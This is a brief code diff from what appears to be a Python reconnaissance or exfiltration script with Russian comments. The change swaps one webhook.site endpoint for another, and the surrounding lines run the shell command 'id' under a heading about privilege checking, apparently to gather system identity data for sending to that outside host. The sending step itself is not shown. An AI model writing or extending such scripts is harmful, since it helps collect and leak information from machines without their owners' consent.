@@ -11,7 +11,7 @@ def run_cmd(cmd):
         return "Error executing command"
 
 # 1. Настройки (Замени на свой актуальный URL!)
-WEBHOOK_URL = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"
+WEBHOOK_URL = "https://webhook.site/5429af37-3c52-47e3-8b1e-068229bcbee5"
 
 # 2. Сбор системных данных (Privilege Check)
 identity = run_cmd('id')
